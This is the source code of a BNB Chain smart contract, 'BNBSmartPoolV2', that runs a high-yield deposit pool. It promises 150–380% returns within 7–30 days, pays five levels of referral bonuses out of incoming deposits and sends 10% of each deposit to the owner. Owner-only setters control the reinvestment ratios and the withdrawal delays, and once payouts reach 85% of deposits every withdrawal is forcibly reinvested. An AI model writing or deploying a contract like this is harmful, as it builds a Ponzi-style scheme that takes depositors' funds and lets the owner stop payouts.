/**
 *Submitted for verification at BscScan.com on 2022-03-04
*/

// SPDX-License-Identifier: MIT License
pragma solidity >=0.8.0;

struct Tarif {
  uint256 life_days;
  uint256 percent;
}

struct Deposit {
  uint256 tarif;
  uint256 amount;
  uint40 time;
}

struct Player {
  uint256 dividends;
  uint256 ref_bonus;  
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_ref_bonus;
  uint256[5] structure; 
  uint40 last_payout;
  Deposit[] deposits;
  address upline;
}

contract BNBSmartPoolV2 {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public ref_bonus;
    
    uint256 public sn = 850;
    uint256 public ri1 = 500;
    uint256 public ri2 = 500;
    uint256 private constant HOUR = 1 hours;
    uint256 private constant DAY = 24 hours;
    
    uint256 public numDays = 1;
    uint256 public numHours = 1;
    
    uint8 public isScheduled;
    uint8 public isHourly;
    uint8 public isDaily;

    uint256 constant MAX_WITHDRAW = 1 ether;
    uint8 constant BONUS_LINES_COUNT = 5;
    uint8 public noReinvesting;
    uint16 constant PERCENT = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [250, 150, 100, 50, 25]; 

    mapping(uint256 => Tarif) public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event RefPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event DividendsTranferred(address indexed _from, address indexed _to, uint256 amount);

    constructor() {
        owner = msg.sender;
        
        uint256 tarifPercent = 15000;
        for (uint8 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 1000;
        }

    }

    function deposit(uint8 _tarif, address _upline) external payable {
		require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 BNB");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 300, "Max 300 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;
        _refPayout(msg.sender, msg.value);

        uint256 amount = msg.value / 10;
        payable(owner).transfer(amount); 
        withdrawn += amount;

	    emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        if(isScheduled == 1) {
            if(isDaily >= 1){
                require (block.timestamp >= (player.last_payout + (DAY * numDays)), "Not due yet for next encashment!");
            }
            if(isHourly == 1) {
                require (block.timestamp >= (player.last_payout + (HOUR * numHours)), "Not due yet for next encashment!");
            }
        }
      
        _payout(msg.sender);

        require(player.dividends > 0 || player.ref_bonus > 0, "No New Dividends Earned Yet!");

        uint256 amount = player.dividends + player.ref_bonus;
		        
        if(noReinvesting > 0){
            payable(msg.sender).transfer(amount);
            emit Withdraw(msg.sender, amount);
            withdrawn += amount;
        }else{
            uint to_reinvest;
            uint to_receive; 
            if(withdrawn > (invested * sn / PERCENT)){
                to_reinvest = amount;
            }else{
                to_reinvest = amount * ri1 / PERCENT;
                to_receive = amount * ri2 / PERCENT;
                
				payable(msg.sender).transfer(to_receive);
                emit Withdraw(msg.sender, to_receive);

                withdrawn += to_receive;
            }

            if(player.deposits.length < 500) {
                player.deposits.push(Deposit({
                    tarif: 7, 
                    amount: to_reinvest,
                    time: uint40(block.timestamp)
                }));
                player.total_invested += to_reinvest;
            }
        }

        player.dividends = 0;
        player.ref_bonus = 0;
        player.total_withdrawn += amount;
        
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT;
            
            payable(up).transfer(bonus); 
			withdrawn += bonus;
			emit Withdraw(up, bonus);
			
            players[up].total_ref_bonus += bonus;
            ref_bonus += bonus;
            emit RefPayout(up, _addr, bonus);
        
            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }   

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }
    
    function sendWithdrawables(address _dest) external {
        Player storage myAcct = players[msg.sender];
        Player storage dest = players[_dest];
        
        _payout(msg.sender);
        _payout(_dest);

        require(myAcct.dividends > 0 || myAcct.ref_bonus > 0, "No New Dividends Earned Yet!");

        uint256 amount = myAcct.dividends + myAcct.ref_bonus;

        dest.dividends = dest.dividends + amount;

        myAcct.dividends = 0;
        myAcct.ref_bonus = 0;
        myAcct.total_withdrawn += amount;

        emit DividendsTranferred(msg.sender, _dest, amount);
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_ref_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.ref_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_ref_bonus,
            structure
        );
    }
    
    function transferOwnership(address newOwner) public returns (bool success) {
        require(msg.sender==owner,'Non-Owner Wallet!');
        owner = newOwner;
        return true;
    }

    function setReinvesting(uint8 newval) public returns (bool success) {
        require(msg.sender==owner,'Unauthorized!');
        noReinvesting = newval;
        return true;
    }

     function setSN(uint256 newval) public returns (bool success) {
        require(msg.sender==owner,'Unauthorized Wallet!');
        sn = newval;
        return true;
    }

    function setRI(uint256 newval1, uint256 newval2) public returns (bool success) {
        require(msg.sender==owner,'Unauthorized Wallet!');
        ri1 = newval1;
        ri2 = newval2;        
        return true;
    }

    function setScheduled(uint8 newval) public returns (bool success) {
        require(msg.sender==owner,'Unauthorized Wallet!');
        isScheduled = newval;
        return true;
    }
    
    function setHourly(uint8 newval) public returns (bool success) {
        require(msg.sender==owner,'Unauthorized Wallet!');
        if(newval >= 1){
            isHourly = 1;
            isDaily = 0;
        }else{
            isHourly = 0;
            isDaily = 1;
        }
        return true;
    }

    function setDaily(uint8 newval) public returns (bool success) {
        require(msg.sender==owner,'Unauthorized Wallet!');
        if(newval >= 1){
            isHourly = 0;
            isDaily = 1;
        }else{
            isHourly = 1;
            isDaily = 0;
        }return true;
    }

    function setHours(uint newval) public returns (bool success) {
        require(msg.sender==owner,'Unauthorized Wallet!');
        numHours = newval;
        return true;
    }

    function setDays(uint newval) public returns (bool success) {
        require(msg.sender==owner,'Unauthorized Wallet!');
        numDays = newval;
        return true;
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _ref_bonus) {
        return (invested, withdrawn, ref_bonus);
    }
    
}